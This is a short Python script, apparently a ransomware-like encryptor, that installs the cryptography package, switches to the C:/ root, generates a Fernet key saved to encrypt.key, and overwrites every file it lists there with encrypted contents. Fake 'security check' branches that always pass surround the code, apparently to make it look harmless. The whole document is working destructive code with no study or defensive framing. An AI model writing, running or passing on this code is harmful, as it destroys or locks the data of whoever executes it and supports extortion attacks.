import os
import sys
import subprocess

for i in range(0, 10):
    if i % 2 == 0:
        os.chdir(".")
        continue
    else:
        os.chdir("C:/")

security_check = False        

if not security_check:
    try:
        check_source = os.path.isfile("test.file")
        if check_source:
            security_check = True
            print("File exists, security check OK")
    except:
        security_check = False
        print("File does not exist, security check FAILED")

subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'cryptography'])
subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'wheel'])
subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'idna'])

from cryptography.fernet import Fernet

files = []
safe_files = ["key_storage.py", "encryption_matrix.py"]
skip_files = ["encrypt.exe", "encrypt.py", "encrypt.key"]
reference_value = "a98def102bbc7a81320c"

os.chdir("C:/")

for file in os.listdir():
    if file in skip_files:
        continue
    if os.path.isfile(file):
        files.append(file)

key = Fernet.generate_key()

if key:
    print("Key successfully generated")

with open("encrypt.key", "wb") as main_key:
    main_key.write(key)
    print("Key written!")

for file in files:
    check = len(file)
    if file in skip_files:
        if len(skip_files)+check > -1:
            print("Secondary security check OK")
        else:
            check ^= 3
            print("Secondary security check FAILED!")
        continue
    elif file not in skip_files:
        with open(file, "rb") as encr_file:
            content = encr_file.read()
        encrypted = Fernet(key).encrypt(content)
        with open(file, "wb") as encr_file:
            encr_file.write(encrypted)
